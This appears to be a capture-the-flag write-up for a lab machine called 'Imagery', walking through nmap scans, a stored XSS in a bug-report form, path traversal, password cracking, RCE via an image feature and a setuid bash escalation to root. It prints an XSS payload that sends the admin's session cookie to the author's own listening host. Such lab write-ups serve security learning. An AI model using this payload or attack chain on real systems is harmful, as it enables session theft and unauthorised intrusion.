# Imagery

![Logo](images/icon.png)

## Port enumeration

First thing I did was scaning the objetive with nmap.

```bash
nmap -p- --open -T5 -n -vvv -Pn imagery.htb
```

This reveals 2 open ports, 22 and 8000

```
22/tcp    open    ssh        syn-act    ttl    63
8000/tcp  open    http-alt   syn-act    ttl    63
```

I scan this two services to reveal more information.

```bash
nmap -p 22,8000 -sCV imagery.htb
```

This reveal that the http service in port 8000 is a python server.

![Logo](images/image18.png)

## Web enumeration

![Logo](images/image7.png)

The first thing I saw was the page home, here, I can only find 2 functional pages, ```upload```, where i can upload an image in the server, I tried to exploit this page for a wile, but nothing worked.

![Logo](images/image21.png)

The other page I found was ```report a bug```, this panel allow me to send a report to the admin, it seems like it can be vulnerable with XSS, so, I test it and I confirmed the vulnerability.

![Logo](images/image25.png)

## XSS Explotation

I send a payload who will allow me to steal the admin cookies.

```html
<img scr=x onerror="new Image().src='http://<myip>:<myport>/?='+encodeURIComponent(document.cookie)"/>
```

This sends me the session cookie to my python server.

![Logo](images/image13.png)

## Admin panel enumeration

With that cookie, I were allowed to log in the page as admin.

![Logo](images/image37.png)

As admin, I had access to ```Admin Panel```.

![Logo](images/image1.png)

Here, I can see who I can download the logs from 2 users, admin and testuser.

After reading these logs, I didnt found nothing interesting, but, after intercept the http request with  burpsuite, I found a path traversal vulnerability.

![Logo](images/image26.png)

## Path traversal explotation

I discovered with /etc/passwd who the 2 users in this machine are web and mark

After a bit, I read the config files, where I found some credentials.

![Logo](images/image27.png)

With john the ripper, I was able to obtain the testuser password.

![Logo](images/image5.png)

Now, I loged in the machine ad testuser, but, I cant see mayor diferences, so, I read the source code.

![Logo](images/image40.png)

And there it is, a RCE, and this feature is only available to testuser.

## RCE exploitation

I just update a image and use the Visual Image Transform feature.

![Logo](images/image12.png)

With burpsuite, in injected the code.

![Logo](images/image22.png)

And with that, I obtained a shell.

![Logo](images/image30.png)

## Local enumeration

After a while i found, in /var/backup, 2 interesting files.

![Logo](images/image31.png)

For some reason I found the root flag there — this must be an error — so I continued with the web backup.

## AES brute force

The backup is encrypted with AES, so I needed to find the password by brute force.

![Logo](images/image17.png)

I made a python script to attack with dictionary.

![Logo](images/image28.png)

Here, I found a oldest version of the app, and, in the database, i found 2 more users and their hashes, web, and mark.

![Logo](images/image2.png)

With john, I reveal the mark password.

![Logo](images/image9.png)

And, with that, I log as mark with su.

![Logo](images/image23.png)

## Privilege scalation

After a short enumeration I discovered that ```/bin/bash``` has the setuid bit set.

![Logo](images/image16.png)

I only needed to execute this binary as its owner, and I became root.

![Logo](images/image20.png)
